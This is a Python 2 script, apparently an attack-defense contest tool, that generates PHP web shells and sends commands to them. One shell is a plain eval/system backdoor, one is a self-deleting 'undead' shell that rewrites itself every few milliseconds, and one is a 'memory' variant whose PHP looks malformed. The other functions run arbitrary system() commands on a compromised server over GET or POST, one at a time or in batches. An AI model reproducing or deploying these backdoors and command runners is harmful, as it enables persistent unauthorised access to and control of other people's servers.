import requests
import os

def shell_gen():
	choose = raw_input('[+]1.Normal Shell.2.Undead Shell.3.Memory Shell.')
	if choose == '1':
		try:
			payload = '<?php '
			payload += '@eval($_POST[a]);@system($_POST[b]);'
			payload += '?>'
			file = open('shell.php',"a")
			file.write(payload)
			file.close()
			print "[+]Succeed."
		except:
			print "[-]Failed."
	if choose == '2':
		try:
			payload = '<?php '
			payload += 'ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='
			payload += "'"
			payload += "shell.php"
			payload += "'"
			payload += ';$code='
			payload += "'"
			payload += '<?php @eval($_POST[a]);@system($_POST[b]); ?>'
			payload += "'"
			payload += ';while(1){file_put_contents($file,$code);usleep(5000);}'
			payload += '?>'
			file = open('shell.php',"a")
			file.write(payload)
			file.close()
			print "[+]Succeed."
		except:
			print "[-]Failed."
	if choose == '3':
		try:
			payload = '<?php '
			payload += 'ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);'
			payload += ''
			payload += 'while(1){php @eval($_POST[a]);@system($_POST[b]);usleep(5000);}'
			payload += '?>'
			file = open('shell.php',"a")
			file.write(payload)
			file.close()
			print "[+]Succeed."
		except:
			print "[-]Failed."
			
def rce(address,password,method):
	while 1:
		command = raw_input('Command(Input stop to exit):')
		if command == 'stop':
			break
		if method == 'get':
			print "*******************************************************" 
			try:
				data = {password:"system('"+command+"');"}
				r = requests.get(address,params=data)
				if r.text != '':
					print address,":"
					print r.text
					print "*******************************************************" 
			except:
				print "[-]Rce Failed."
				print "*******************************************************" 
		if method == 'post':
			print "*******************************************************" 
			try:
				data = {password:"system('"+command+"');"}
				r = requests.post(address,data=data)
				if r.text != '':
					print address,":"
					print r.text
					print "*******************************************************" 
			except:
				print "[-]Rce Failed."
				print "*******************************************************"

def batch_rce(address,password,method,command):
	if method == 'get':
		print "*******************************************************" 
		try:
			data = {password:"system('"+command+"');"}
			r = requests.get(address,params=data)
			if r.text != '':
				print address,":"
				print r.text
				print "*******************************************************" 
		except:
			print "[-]Rce Failed."
			print "*******************************************************" 
	if method == 'post':
		print "*******************************************************" 
		try:
			data = {password:"system('"+command+"');"}
			r = requests.post(address,data=data)
			if r.text != '':
				print address,":"
				print r.text
				print "*******************************************************" 
		except:
			print "[-]Rce Failed."
			print "*******************************************************"